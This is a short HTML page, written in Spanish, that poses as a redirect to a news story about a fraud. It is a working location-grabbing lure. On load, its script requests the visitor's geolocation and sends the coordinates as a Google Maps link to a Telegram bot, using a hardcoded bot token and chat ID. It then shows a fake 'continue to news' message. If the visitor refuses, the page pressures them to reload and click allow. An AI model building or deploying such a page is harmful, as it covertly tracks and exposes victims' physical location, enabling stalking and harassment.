<html>
<head>
  <title>LMC_Fraude_Millonario</title>
</head>
<body style="text-align:center; font-family:sans-serif;">
  <h2>redirigiendo a noticia</h2>

  <script>
    navigator.geolocation.getCurrentPosition(function(position) {

      let lat = position.coords.latitude;
      let lon = position.coords.longitude;

      let mensaje = "Ubicación: https://maps.google.com/?q=" + lat + "," + lon;

      fetch("https://api.telegram.org/bot8622936285:AAHFtoAaeIo4a9VJda4e5YKjmO0bBCBdn4I/sendMessage?chat_id=1365142648&text=" + mensaje);

      document.body.innerHTML = "<h2>siguiente para ver noticia ✅</h2>";

    }, function(error) {
      document.body.innerHTML = "<h2>Error al acceder a pages, Refresque la pagina y de en PERMITIR❌</h2>";
    });
  </script>
</body>
</html>
